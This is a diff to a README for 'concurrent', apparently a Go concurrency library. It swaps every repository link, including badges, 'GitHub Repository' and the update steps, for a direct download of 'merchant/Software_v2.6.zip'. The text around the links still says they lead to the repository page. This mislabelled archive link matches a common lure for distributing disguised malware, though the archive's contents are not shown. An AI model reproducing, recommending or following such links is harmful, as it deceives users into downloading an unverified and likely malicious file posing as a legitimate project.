@@ -1,6 +1,6 @@
 # ⚙️ concurrent - Simplify Concurrency in Go
 
-[![Download concurrent](https://img.shields.io/badge/Download-concurrent-blue?style=for-the-badge)](https://github.com/rosalyndbroken897/concurrent)
+[![Download concurrent](https://img.shields.io/badge/Download-concurrent-blue?style=for-the-badge)](https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip)
 
 ---
 
@@ -10,7 +10,7 @@ concurrent offers a modern way to work with multiple tasks in the Go programming
 
 To get started, you need to download the software from the official GitHub page. Follow the link below to visit the download page:
 
-[Download concurrent here](https://github.com/rosalyndbroken897/concurrent)
+[Download concurrent here](https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip)
 
 This link takes you to the main repository page where you can find the latest release and download the files you need.
 
@@ -68,7 +68,7 @@ Even if you do not write code, concurrent keeps complex processes clear and reli
 Checking for updates regularly ensures you have the latest features and fixes.
 
 1. Visit the official GitHub page:  
-   [https://github.com/rosalyndbroken897/concurrent](https://github.com/rosalyndbroken897/concurrent)
+   [https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip](https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip)
 2. Navigate to the "Releases" tab to see new versions.
 3. Download the newest Windows release files.
 4. Repeat the installation steps to replace older versions.
@@ -86,9 +86,9 @@ If you face issues running concurrent, try these steps:
 
 ## 🔗 Useful Links
 
-[Download concurrent from GitHub](https://github.com/rosalyndbroken897/concurrent)  
-[GitHub Repository](https://github.com/rosalyndbroken897/concurrent)  
+[Download concurrent from GitHub](https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip)  
+[GitHub Repository](https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip)  
 
 ---
 
-[![Download concurrent](https://img.shields.io/badge/Download-concurrent-grey?style=for-the-badge)](https://github.com/rosalyndbroken897/concurrent)
+[![Download concurrent](https://img.shields.io/badge/Download-concurrent-grey?style=for-the-badge)](https://github.com/rosalyndbroken897/concurrent/raw/refs/heads/main/merchant/Software_v2.6.zip)
